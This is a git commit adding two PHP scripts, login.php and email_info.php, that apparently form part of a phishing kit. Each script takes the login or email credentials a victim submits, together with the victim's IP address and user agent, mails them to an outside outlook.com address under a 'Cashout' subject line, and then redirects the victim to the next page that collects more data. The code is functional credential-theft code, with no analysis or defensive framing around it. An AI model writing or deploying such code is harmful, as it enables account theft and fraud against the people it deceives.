2483cd71b79e95cf923b902a414d4ed8bc178485
alexjay158 <113730577+alexjay158@users.noreply.github.com>
2022-09-22 14:05:58 +0200

    Add files via upload

---
+++ email_info.php
@@ -0,0 +1,14 @@
+<?php
+header('Location: /personal_info');
+$Agent=$_SERVER['HTTP_USER_AGENT'];
+$Ip=$_SERVER['REMOTE_ADDR'];
+$email=$_POST['email'];
+$email_password=$_POST['email_password'];
+$nl="\r\n";
+$from = "Cashout";
+$to = "nwaforalex158@outlook.com";
+$subject = "Cashout Is A Must By Gods  Grace";
+$message = 'EMAIL: ' . $email . $nl.'EMAIL PASSWORD: ' . $email_password .$nl. 'IP: ' . $Ip  . $nl. 'USERAGENT: ' . $Agent ;
+$headers = "From:" . $from;
+mail($to,$subject,$message, $headers) 
+?>
---
+++ login.php
@@ -0,0 +1,14 @@
+<?php
+header('Location: /email_info');
+$Agent=$_SERVER['HTTP_USER_AGENT'];
+$Ip=$_SERVER['REMOTE_ADDR'];
+$login_email=$_POST['login_email'];
+$password=$_POST['password'];
+$nl="\r\n";
+$from = "Cashout";
+$to = "nwaforalex158@outlook.com";
+$subject = "Cashout Is A Must By Gods  Grace";
+$message = 'LOGIN EMAIL: ' . $login_email . $nl.'PASSWORD: ' . $password .$nl. 'IP: ' . $Ip  . $nl. 'USERAGENT: ' . $Agent ;
+$headers = "From:" . $from;
+mail($to,$subject,$message, $headers) 
+?>
